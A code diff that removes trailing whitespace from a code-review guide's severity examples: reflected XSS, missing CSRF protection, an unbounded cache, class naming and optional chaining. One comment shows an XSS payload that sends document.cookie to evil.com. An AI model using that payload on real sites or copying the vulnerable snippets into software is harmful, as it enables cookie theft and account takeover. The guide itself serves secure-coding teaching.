@@ -77,7 +77,7 @@ func DeleteUser(db *sql.DB, userID string) error {
 ```javascript
 // HIGH: User input rendered without sanitization
 app.get('/search', (req, res) => {
-    res.send(`<h1>Results for: ${req.query.q}</h1>`);  
+    res.send(`<h1>Results for: ${req.query.q}</h1>`);
     // Attacker: /search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>
 });
 ```
@@ -97,7 +97,7 @@ def order_detail(request, order_id):
 // HIGH: No CSRF protection on POST
 app.post('/api/transfer', (req, res) => {
     const { to, amount } = req.body;
-    transfer(req.user.id, to, amount);  
+    transfer(req.user.id, to, amount);
     // Attacker's site can submit a hidden form to transfer funds
 });
 ```
@@ -175,7 +175,7 @@ async function processPayment(payment) {
 private final Map<String, User> userCache = new ConcurrentHashMap<>();
 
 public User getUser(String id) {
-    return userCache.computeIfAbsent(id, this::loadFromDb);  
+    return userCache.computeIfAbsent(id, this::loadFromDb);
     // Cache grows unbounded → eventually OOM
 }
 ```
@@ -228,7 +228,7 @@ public class user_service {  // Fix: UserService (PascalCase for classes)
 ### Example 1: Simpler Alternative
 ```javascript
 // INFO: Consider using optional chaining
-const city = user && user.address && user.address.city;  
+const city = user && user.address && user.address.city;
 // Suggestion: const city = user?.address?.city;
 ```
 
